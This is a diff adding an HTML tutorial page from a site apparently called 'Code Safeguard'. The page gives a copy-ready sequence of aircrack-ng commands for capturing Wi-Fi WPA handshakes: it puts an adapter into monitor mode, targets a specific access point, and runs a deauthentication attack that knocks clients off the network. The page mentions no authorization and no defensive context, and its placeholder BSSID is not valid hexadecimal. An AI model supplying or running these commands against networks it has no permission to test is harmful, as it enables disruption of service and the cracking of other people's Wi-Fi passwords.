@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="logo.png"   type="image/x-icon" />
+    <link rel="stylesheet" href="pages.css">
+    <title>Wifi Handshakes</title>
+
+    </head>
+    <body>
+      <div class="container">
+        <nav>
+          <a href="home.html" style="font-size: 30px;">
+              <h2 class="abc">CODE SAFEGUARD</h2>
+          </a>
+          <a href="wifi_handshakes.html">
+              <ul>
+                  <li>Wifi Handshakes</li>
+              </ul>
+          </a>
+      </nav><br>
+   
+  
+
+
+
+     <div class="custom-box">
+     <p class="ab"> <br> Requirements :<br></p>
+   <p class="bcd">   <br>Kali Linux <br>
+    <br>Internet <br></p>
+     </div><br>
+     <iframe width="560" height="315" src="https://www.youtube.com/embed/i0upqNIbKec?si=h-ZpWY0rW2JLPnbi" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+     <br><div class="custom-box">
+        <b class="bc">  <br><br>COMMANDS <br></b><br><br>
+        <div class="button-container">
+            <button class="copy-button" onclick="copyCommandsToClipboard()">Copy Commands</button>
+        </div><br>
+        <pre class="command"><b>
+        
+            lsusb <br>
+            airmon-ng start wlan0<br>
+            airodump-ng wlan0<br>
+            airodump-ng -c 01 --bssid ab:bc:cd:ef:gh -w /root/wifi/ wlan0<br>
+            aireplay-ng -0 10 -a ab:bc:cd:ef:gh wlan0<br>
+
+        </pre>
+        <i> <br>Above are the commands to capture Wifi Handshakes with wifi adapters ......</i>
+   
+    
+        <br>
+    </div>
+</div>
+
+<script src="pages.js"></script>
+    
+</div>
+
+
+    </body>
+    </html>
